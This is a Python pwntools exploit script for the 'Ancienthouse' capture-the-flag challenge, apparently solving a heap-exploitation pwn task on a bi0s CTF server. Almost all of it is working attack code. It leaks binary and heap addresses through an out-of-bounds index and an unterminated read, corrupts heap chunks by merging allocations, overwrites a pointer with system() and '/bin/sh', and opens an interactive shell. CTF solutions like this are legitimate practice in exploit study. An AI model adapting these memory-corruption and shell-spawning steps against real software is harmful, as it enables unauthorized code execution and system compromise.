#!/usr/bin/env python3

from pwn import *

exe = ELF("./Ancienthouse_patched")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


#r = conn()
r = remote("pwn.challenge.bi0s.in", 1230)

def sl(a,b):
    r.sendlineafter(a,b)

def s(a,b):
    r.sendafter(a,b)

def start(data):
    s("Who dares to enter these hallowed halls!! : ", data)

def alloc(size, name):
    sl(">> ", "1") 
    sl(": ", str(size))
    s(": ", name)

def merge(id1, id2):
    sl(">> ", "3")
    sl(": ", str(id1))
    sl(": ", str(id2))

def battle(index):
    sl(">> ", "2")
    sl(": ", str(index))
   

def spare_or_kill(kill):
    if kill:
        sl(">>", "1")
    else:
        sl(">>", "2")



def main():
    
    start(b"M"*0x40)
    battle(-7)

    r.recvuntil("Starting battle with ")
    binary_leak = u64(r.recv(6).ljust(8, p8(0)))
    log.info("Binary leak @ 0x%x", binary_leak)
    exe.address = binary_leak - 0x4008
    log.info("Binary base @ 0x%x", exe.address)
    
    spare_or_kill(0)

    alloc(0x20, b"0"*0x20)
    alloc(0x20, b"1"*0x20)
    alloc(0x60, b"2"*0x60)

    battle(0)

    
    r.recvuntil(b"0"*0x20)
    heap_leak = u64(r.recv(6).ljust(8, p8(0)))
    log.info("Heap leak @ 0x%x", heap_leak)
    
    chunk2 = heap_leak - 0x2040
    log.info("Need to corrupt this 0x%x", chunk2)
    
    alloc(0x10, b"A"*0x10) #3
    alloc(0x10, b"B"*0xf + p8(chunk2 & 0xff)) #4
    alloc(0x10, p64(chunk2)[1::] + p64(0x1)) #5
    alloc(0x18, b"TARGET") #6

    for i in range(7):
        battle(5) 

    spare_or_kill(1)
    
    merge(3, 4)
    
    battle(6)
    spare_or_kill(1)

    
    alloc(0x50, p64(exe.plt['system']) + p64(chunk2 + 0x10) + b"/bin/sh\x00")
    
    sl(">> ", str(ord("M")))
    
    r.interactive()


if __name__ == "__main__":
    main()
